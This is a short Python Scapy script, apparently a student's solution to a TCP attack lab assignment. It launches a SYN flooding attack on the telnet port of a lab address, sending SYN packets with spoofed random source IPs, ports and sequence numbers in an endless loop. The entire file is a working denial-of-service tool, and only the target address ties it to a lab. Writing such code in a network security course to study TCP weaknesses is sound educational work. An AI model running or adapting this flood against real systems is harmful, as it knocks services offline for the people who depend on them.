#!/usr/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

print("CMPE209-Assignment1-016707314-TCPAttack Lab-Task1.1-Launching the SYN flooding attack");

ip = IP(dst="10.9.0.5")	#victim's IP address
tcp = TCP(dport=23, flags='S')	#23 for telnet - using telnet service
pkt = ip/tcp

while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source ip
  pkt[TCP].sport = getrandbits(16) # source port
  pkt[TCP].seq = getrandbits(32) # sequence number
  send(pkt, iface = 'br-62f4ebf4c30a', verbose = 0)
